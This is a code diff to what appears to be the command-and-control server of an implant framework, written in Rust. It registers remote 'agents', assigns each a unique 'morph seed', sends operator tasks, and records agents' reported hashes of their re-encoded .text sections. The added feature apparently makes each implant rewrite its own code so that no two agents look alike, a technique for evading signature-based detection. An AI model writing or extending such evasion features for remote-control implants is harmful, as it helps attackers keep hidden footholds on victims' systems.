@@ -254,6 +254,12 @@ async fn handle_agent(
                     );
                 }
 
+                // Generate a unique morph seed for this session.  The seed is
+                // tracked in `assigned_seeds` to ensure no two active agents
+                // share the same transformation.
+                let morph_seed = state.generate_unique_seed();
+                state.assigned_seeds.insert(morph_seed);
+
                 let entry = AgentEntry {
                     connection_id: conn_id.clone(),
                     agent_id: agent_id.clone(),
@@ -261,6 +267,8 @@ async fn handle_agent(
                     last_seen: now_secs(),
                     tx: tx.clone(),
                     peer: peer.clone(),
+                    morph_seed,
+                    text_hash: None,
                 };
                 state.registry.insert(conn_id.clone(), entry);
                 registered = true;
@@ -268,10 +276,32 @@ async fn handle_agent(
                     connection_id = %conn_id,
                     agent_id = %agent_id,
                     %peer,
+                    morph_seed = format!("0x{morph_seed:016x}"),
                     "agent registered"
                 );
+
+                // Immediately send the morph seed to the agent so it can
+                // perform its first re-encode.  Using SetReencodeSeed (not
+                // MorphNow) because the first morph should be asynchronous —
+                // the agent applies it during its next periodic cycle or on
+                // its own schedule.  Operators can use MorphNow later for an
+                // immediate synchronous re-encode.
+                if tx
+                    .send(Message::TaskRequest {
+                        task_id: uuid::Uuid::new_v4().to_string(),
+                        command: common::Command::SetReencodeSeed { seed: morph_seed },
+                        operator_id: None,
+                    })
+                    .await
+                    .is_err()
+                {
+                    tracing::warn!(
+                        connection_id = %conn_id,
+                        "failed to send initial morph seed — writer task closed"
+                    );
+                }
             }
-            Message::TaskResponse { task_id, result } => {
+            Message::TaskResponse { task_id, result, .. } => {
                 if let Some((_, sender)) = state.pending.remove(&task_id) {
                     let _ = sender.send(result);
                 } else {
@@ -280,6 +310,27 @@ async fn handle_agent(
             }
             Message::AuditLog(ev) => {
                 state.audit.record(ev);
+            }
+            Message::MorphResult {
+                connection_id: conn_id_ref,
+                text_hash,
+            } => {
+                // Record the agent's post-morph .text hash.  Only accept
+                // reports that match this connection to prevent spoofing.
+                if conn_id_ref == conn_id {
+                    state.update_text_hash(&conn_id, &text_hash);
+                    tracing::info!(
+                        connection_id = %conn_id,
+                        %text_hash,
+                        "agent reported post-morph .text hash"
+                    );
+                } else {
+                    tracing::warn!(
+                        connection_id = %conn_id,
+                        reported_conn = %conn_id_ref,
+                        "agent sent MorphResult with mismatched connection_id — ignoring"
+                    );
+                }
             }
             other => {
                 tracing::debug!("ignoring agent->server message: {:?}", other);
@@ -290,7 +341,12 @@ async fn handle_agent(
     drop(tx);
     let _ = writer.await;
     if registered {
-        state.registry.remove(&conn_id);
+        // Release the morph seed back to the available pool.
+        if let Some(entry) = state.registry.remove(&conn_id) {
+            state.release_seed(entry.1.morph_seed);
+        } else {
+            state.registry.remove(&conn_id);
+        }
         tracing::debug!(connection_id = %conn_id, "agent entry removed from registry");
     }
     Ok(())
